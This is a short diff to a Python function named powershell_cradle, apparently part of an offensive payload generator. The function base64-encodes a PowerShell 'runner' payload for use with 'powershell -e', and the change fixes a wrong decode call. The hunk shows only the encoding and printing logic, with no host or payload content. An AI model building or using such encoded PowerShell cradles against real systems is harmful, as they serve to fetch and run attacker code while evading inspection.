@@ -117,7 +117,7 @@ def powershell_cradle():
     b64_runner_cal = base64.b64encode(runner_cal_unecoded)
     b64_runner_cal = b64_runner_cal.decode()
     print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
-    b64_runner_cal_decoded = base64.b16decode(b64_runner_cal).decode()
+    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
     print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
     return
 
